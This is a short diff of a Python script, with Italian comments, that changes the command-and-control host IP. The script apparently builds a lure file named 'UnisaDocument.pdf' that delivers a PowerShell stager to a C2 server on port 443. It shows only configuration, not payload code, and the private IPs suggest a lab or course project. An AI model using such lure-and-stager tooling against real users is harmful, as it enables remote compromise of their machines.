@@ -18,7 +18,7 @@ import tempfile
 from pathlib import Path
 
 # ── Configurazione ────────────────────────────────────────────────────────────
-C2_HOST     = "192.168.42.124"
+C2_HOST     = "192.168.122.47"
 C2_PORT     = 443
 OUTPUT      = Path(__file__).parent / "UnisaDocument.pdf"
 STAGER_PATH = Path(__file__).parent.parent.parent / "client" / "stager.ps1"
